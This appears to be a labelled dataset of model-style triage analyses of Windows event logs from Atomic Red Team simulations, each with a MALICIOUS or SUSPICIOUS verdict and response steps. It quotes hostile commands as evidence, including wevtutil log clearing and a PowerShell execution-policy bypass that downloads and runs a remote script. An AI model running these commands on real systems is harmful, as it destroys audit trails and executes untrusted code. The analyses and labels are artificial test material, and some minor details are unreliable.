2. **Execution of PsExec:**
   - The use of PsExec is logged presiding process execution. PsExec (`PSEXESVC`) is a legitimate remote administration tool but is frequently used by attackers to move laterally through networks or to execute commands remotely. Its presence, especially if unexpected in the context, is frequently suspect.

3. **Abnormal PowerShell Activity:**
   - There are PowerShell log events showing execution with potentially dangerous commands such as `PsExec.exe` within the PowerShell script. The logs indicate user `admin_test` executing these commands which is unusual if not part of standard procedures, particularly without a documented need.
   - Additional PowerShell activity can be seen executing via command-line, appearing to inspect or manipulate system files (`Get-Item` and `Get-Content`) which is often used for reconnaissance.

4. **Remote and Privilege Escalations:**
   - Security events such as `4624 - Successful Logon` and `4672 - Special Privileges Assigned` show multiple logon attempts with elevated privileges granted to `admin_test` using NTLM authentication from an external workstation `DESKTOP-3HL5B2P`. The repeated granting of special privileges can be indicative of privilege escalation attempts.

5. **Sysinternals Execution:**
   - The execution of tools like PsExec and the associated services like `PSEXESVC.exe` under high integrity and `NT AUTHORITY\SYSTEM` indicates possible unauthorized attempts to gain and execute actions with elevated permissions.

### Potential Malicious Activity:

Based on the analysis, the following indicates highly suspicious, if not outright malicious, behavior:

- System logs and PowerShell logs are cleared, likely to conceal evidence of actions performed on the host.
- PsExec usage combined with command-line PowerShell operations remotely initiated, suggesting potential lateral movement or backdoor installation.
- User `admin_test`, originating from what appears to be a remote or unauthorized machine with administrator-equivalent privileges, further supports this suspicion.

### Assessment and Resolution:

- **Resolution:** MALICIOUS

### Guidance on How to Proceed:

1. **Immediate System Isolation:**
   - Disconnect Server002 from the network to prevent further unauthorized access or lateral movement throughout the network.

2. **User Access Review:**
   - Investigate user accounts mentioned in the logs (e.g., `admin_test`) and verify their legitimacy and security policies associated with such accounts.

3. **Comprehensive System Audit:**
   - Conduct a full forensic analysis on the server and associated logs to determine the scope of the breach.

4. **Patch and Update:**
   - Ensure all systems are updated with the latest security patches, including those for remote tools like PsExec if needed within the environment.

5. **Security Policy Reinforcement:**
   - Implement or reinforce strict logging and monitoring policies to detect and respond to similar activities in the future.

6. **Incident Reporting:**
   - Report the incident as per organizational policies, and potentially to relevant authorities if data theft or significant fraud is suspected.

By adhering to these recommendations, the aim is to restore the integrity of the affected systems and prevent recurrence of similar incidents."
Cobalt Strike post-exploitation pipe (4.2 and later),"Based on the provided Windows event logs, there are several indicators suggesting potential malicious activity:

1. **Event Log Cleared Events**: 
   - Security and system logs have events with Event ID 1102 and 104, respectively, indicating that the logs were cleared by the user ""admin_test"". This is often a red flag as attackers frequently clear logs to cover their tracks.

2. **High Privileges Assigned**:
   - Event ID 4672 shows that the user ""admin_test"" has been assigned several high privileges including SeDebugPrivilege, SeTakeOwnershipPrivilege, and others. This could be indicative of privilege escalation.

3. **Suspicious PowerShell and Command Line Usage**:
   - Sysmon logs indicate the execution of ""wevtutil.exe” to clear event logs (CommandLine: `""C:\\Windows\\system32\\wevtutil.exe"" cl [log]`). The use of wevtutil to clear logs in conjunction with high privileges might suggest an attempt to cover activities.
   - The execution of unauthorized or suspicious executables like `namedpipes_executor.exe`, `namedpipes_server.exe`, and `namedpipes_client.exe` observed in the Sysmon logs. These are located in temporary directories and could represent payloads from an attack toolkit or malware testing (potentially from a tool like Atomic Red Team, often used for threat emulation).

4. **Use of NTLM Logon**:
   - An NTLM logon session is established by ""admin_test"". NTLM can sometimes be used for lateral movement within a network if not properly secured.

5. **ExternalTools Run from Temp Directory**:
   - The running of executables from the Temp directory (""namedpipes_executor.exe"") may indicate the execution of tools designed for testing security controls or malicious intent.

**Assessment:**
- The presence of log clearing activities, the assignment of high privileges, suspicious process executions involving PowerShell and command utilities, as well as the execution of potentially unwanted software originating from temporary directories, collectively indicate activities that are highly unusual and consistent with malicious intent.

**Resolution: MALICIOUS**
- Given these indications, the findings lean towards a malicious intent. At this point, it's crucial to undertake a thorough investigation to ascertain the scope and impact, including:
   - Reviewing network logs for signs of lateral movement.
   - Checking for unauthorized access or data exfiltration.
   - Scanning the host for known malware signatures.
   - Reassessing security policies for privileges granted to users.
   - Implementing additional logging and monitoring on critical servers.

Moving forward, it is advised to contain and mitigate the threat by isolating the affected system, performing a detailed forensic analysis, and reviewing security measures to prevent future incidents."
WMI Reconnaissance List Remote Services,"Upon analyzing the provided Windows event logs, several entries stand out as potentially suspicious and warrant further investigation.

### Suspicious and Anomalous Behaviors Identified:

1. **Event Log Clearing:**
   - Multiple instances of event log clearing are observed, executed by the user `admin_test`. The event IDs 1102 and 104 in the Security, System, and PowerShell logs indicate the clearing of event logs.
   - The process `wevtutil.exe` is used for these operations, visible in Sysmon logs with details of execution from paths such as `C:\\Windows\\system32\\wevtutil.exe` with the `cl` (clear) command-line switch.

2. **Privileges Granted:**
   - An event (ID 4672) indicates that the user `admin_test` was granted a set of sensitive privileges, including `SeDebugPrivilege`, `SeBackupPrivilege`, and others. This event suggests the user has higher privileges that could potentially compromise system security if misused.

3. **Time Change Events:**
   - Two time change events (Event ID 4616) are recorded, indicating the system time was adjusted. Malicious activities sometimes involve timestamp manipulation to either hide or mislead log event timelines.

4. **Process Execution Patterns:**
   - A sequence of process executions following the command `wmic` with the search for spooler service processes resembling reconnaissance or enumeration activities.
   - The presence of `whoami.exe`, `hostname.exe`, and `wmic` suggests command-line reconnaissance, typically used in the initial stages of an attack to gather information about the system and user environment.

### Indicators of Malicious Activity:

- **Log Manipulation and Clearing:**
  The clearing of security, system, and PowerShell logs is a significant indicator of malicious activity. Adversaries often clear logs to cover their tracks after a compromise or during unauthorized activities.

- **Reconnaissance Commands:**
  Reconnaissance commands and execution patterns, such as using `whoami.exe` and `wmic`, are often associated with lateral movement or preparation for privilege escalation.

### Assessment:

Based on the analysis of the logs, there is substantial evidence pointing toward activities aligning with malicious behaviors. The log clearing attempts, privilege elevations, and use of potentially reconnaissance-related command-line activities suggest an effort to obfuscate actions and possibly prepare for further unauthorized access or exploitation.

### Resolution:
- **MALICIOUS**

### Recommendations:

1. **Immediate Actions:**
   - Conduct an in-depth forensic analysis of `admin_test` account activities to determine the scope of potential compromise.
   - Review system configurations and check for any unauthorized changes or indicators of persistent threats.

2. **Containment and Remediation:**
   - Temporarily disable the `admin_test` account and reset relevant credentials.
   - Monitor network traffic for unusual patterns that may indicate malicious lateral movement within the network.

3. **Long-term Measures:**
   - Implement stricter controls on privilege assignments and regularly audit privileged account activities.
   - Consider deploying advanced logging and monitoring solutions to detect and correlate suspicious activities more effectively.

Overall, these findings suggest a breach has possibly occurred, and immediate investigation and remediation steps are necessary to safeguard the affected systems and prevent further unauthorized activities."
WMI Reconnaissance Users,"During the analysis of the provided Windows event logs, several events suggest potentially suspicious or concerning activities that need further examination:

1. **Event Log Clearing (Security Event ID 1102):**
   - The security log shows an event (ID 1102) indicating that the event log has been cleared. The user ""admin_test"" was responsible for this action. Log clearing is often a tactic used by attackers to cover their tracks, suggesting potential malicious intent.

2. **Unusual Privilege Use (Security Event ID 4672):**
   - Several events indicate user ""admin_test"" acquired a high number of special privileges (SeDebugPrivilege, SeTakeOwnershipPrivilege, etc.). While this could be legitimate for administrative tasks, such privileges should be closely monitored as they can be misused for malicious activities.

3. **Time Manipulation (System Event ID 1):**
   - There are entries indicating an adjustment of the system time (Event ID 1). Although sometimes legitimate, such actions can also be an attempt to alter log timestamps to evade detection.

4. **WmiPrvSE.exe Activity (Security Event ID 4798):**
   - The logs show WMI Provider Host (`WmiPrvSE.exe`) accessing various user accounts, with ""admin_test"" appearing consistently. This could indicate legitimate management or systems tasks or be leveraged for enumeration in reconnaissance activities by an attacker.

5. **Multiple Event Log Cleans:**
   - The logs for channels like Application, System, and Windows PowerShell were cleared tactically (as seen in events linked with wevtutil.exe in Sysmon logs). Systematic clearing of log channels suggests attempts to erase tracks systematically.

6. **Sysmon Logs and Event Utilization:**
   - Repeated execution of `wevtutil.exe` with arguments to clear different log channels confirms suspicious activity, possibly evoking malicious intent to remove artifacts from detective security controls.

Based on these observations, the overall behavior depicted in the logs is consistent with activities that could indicate compromise. The combination of event log clearing, unusual privilege usage, and suspicious process executions is alarming, pointing towards potentially malicious activities.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**
- **Conduct a Deeper Forensic Investigation:** Retrieve and analyze deleted logs using system snapshots or backups to seek further indications of a breach.
- **Review User admin_test Activities:** Examine the recent activities and access patterns associated with the ""admin_test"" account for anomalies.
- **Implement Monitoring and Alerts:** Enhance monitoring to resume real-time notifications on event log clearing and privilege escalations.
- **Investigate Network Traffic:** Analyze network logs for any unusual outbound traffic, especially from the concerned system.
- **Check for Persistence Mechanisms:** Look into planned tasks, startup entries, and services that may have been altered or created by the suspicious actor."
Command Prompt read contents from CMD file and execute,"### Detailed Analysis of Logs

#### Suspicious or Anomalous Behavior

1. **Log Clearance Activity**:
    - **Security Log Cleared**: Event ID 1102 in the Security log indicates that the logs have been cleared by the user `admin_test`.
    - **System and PowerShell Logs Cleared**: Event ID 104 in the System log indicates that logs were cleared from both the System and Windows PowerShell channels by the same user `admin_test`.

2. **Process Execution Related to Log Clearance**:
    - The process `wevtutil.exe`, which is used for managing event logs, was executed with command lines that include `cl` arguments which are indicative of log clearance actions for channels such as ""Security"", ""System"", and ""Windows PowerShell"".

3. **Usage of PowerShell**:
    - A process execution log shows `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` running but doesn't provide any clear indication of the commands being executed, which can signal potentially obfuscated or suppressed activity.

4. **Atomic Red Team Evidence**:
    - Commands such as `""cmd.exe"" /c cmd /r cmd<""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1059.003\\src\\t1059.003_cmd.cmd""` suggest a potential security testing or simulation activity, which might be designed to resemble real world attacks for detection and mitigation purposes.

#### Indicators of Malicious Activity or Compromise

- **Event Log Clearing**: Clearing of event logs, especially security logs, is a common adversarial tactic to cover tracks after illicit activities such as privilege escalations or lateral movement.
- **Command Execution with Unclear Intent**: The use of PowerShell and cmd with unclear or obfuscated command line operations implies potential risk if the purpose cannot be validated as part of normal administrative tasks or testing.
- **Presence of Tools Related to Atomic Red Team**: While this could signal legitimate testing, without explicit permission or knowledge, it can signify unauthorized security exercise mimicking attack vectors.

### Assessment of Situation

The log activity primarily indicates:
- An explicit attempt to clear log data which is commonly associated with covering tracks for potentially unauthorized or malicious operations.
- Evidence that `admin_test` executed specific command line utilities like `wevtutil` at a high integrity level, aiming for log channel clearance, which can obscure historical data necessary for thorough incident investigation.

### Threats or Risks Identified

- The actions captured in the logs under `admin_test`'s credential suggest deliberate intent to manipulate or eliminate log visibility. This elevates the situation from a policy breach to a potential security risk.
- Execution of potentially benign testing scenarios (e.g., `AtomicRedTeam`) without announced intention could confuse incident response efforts and make it challenging to differentiate between genuine attacks and assessments.

### Guidance on How to Proceed

1. **Investigate User Activity**:
   - Conduct a user activity review of `admin_test` to verify if activities align with authorized administrative roles, possibly confirming whether this user had legitimate reasons for log clearance.
  
2. **Analyze Command Execution Context**:
   - Verify the scripts and applications initiated by `admin_test`, such as those stemming from `AtomicRedTeam`, to establish explicit allowance or sanction by the organization.

3. **Review Audit Policies**:
   - Ensure the audit policy is being enforced properly to detect and log sensitive operations. Immediately reinforce controls around event logging and restrict the privilege of event log clearance.

4. **Limit Exposure & Respond**:
   - Confirm all systems are using up-to-date security measures to thwart unauthorized access and manipulation.
   - If the behavior is unverified to be part of a known exercise, enhance monitoring across accounts, particularly those with elevated privileges.

### Conclusion

**Resolution: SUSPICIOUS**

The log entries point to suspicious activities that warrant further investigation. Specifically, the clearing of logs under the user account `admin_test` is notable for attempting to cover up or simulate attack scenarios. Verification is critical in determining the legitimacy and necessity of such actions."
Powershell MsXml COM object - with prompt,"Upon reviewing the provided log entries, several indicators of potentially malicious activity stand out that warrant further scrutiny:

1. **Log Clearing Activity**:
   - Multiple instances of the `wevtutil.exe` command being used to clear event logs are observed in the logs. The command lines such as `""C:\\Windows\\system32\\wevtutil.exe\"" cl Security""`, `""C:\\Windows\\system32\\wevtutil.exe\"" cl System""`, and similar entries indicate that security, system, and other event logs have been cleared.
   - Events in the Security and System channels show log file clearing activities (`EventID 1102` for Security log clearing and `EventID 104` for System log clearing), performed by the user `admin_test`. This is often a tactic used by attackers post-compromise to cover their tracks.

2. **Suspicious PowerShell Execution**:
   - The PowerShell logs show execution with the `-exec bypass` and `-noprofile` flags, aimed at bypassing execution policies, along with the use of `IEX` for executing code from a downloaded script. This aligns with tactics used in PowerShell-based attacks.
   - The script is being fetched from an external source, as seen in the command: `https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1`. This strongly suggests the possibility of a fileless attack or script-based malware being used.

3. **Time Change Activity**:
   - Event logs indicate changes in system time (`EventID 4616`). Although not inherently malicious, time manipulation could potentially be used to mislead logging efforts or to disrupt time-based defenses like Kerberos authentication.

4. **Account Usage and Process Execution**:
   - The activity takes place under user `admin_test` with high-integrity-level processes, potentially indicating either a legitimate administrative task or misuse of elevated privileges. The consistency of actions performed under this account, especially the log clearing and suspicious process execution, suggests unauthorized use of administrative credentials.

**Assessment**:
Based on these observations, the behavior displayed in the logs does not appear to be benign. The combination of suspicious PowerShell usage, systematic log clearing, and potential time manipulation are strong indicators of compromise.

**Recommendation**:
- **Immediate Steps**:
  - Conduct a full forensic analysis to understand how access was gained using the `admin_test` account.
  - Investigate the origin of the PowerShell script and verify whether it has a legitimate purpose or is part of a known attack.
  - Audit all recent administrative activities on the affected host and associated accounts.
  - Review and validate security policies, particularly around PowerShell execution and event log management.

- **Mitigation**:
  - Implement tighter monitoring around PowerShell uses, such as logging module and script block logging.
  - Enforce the use of Managed Service Accounts (MSAs) or Group Managed Service Accounts (gMSAs) to reduce credential risks.
  - Increase the frequency and depth of security awareness training, focusing on identifying phishing attempts and secure handling of credentials.

Final Resolution: **MALICIOUS**"
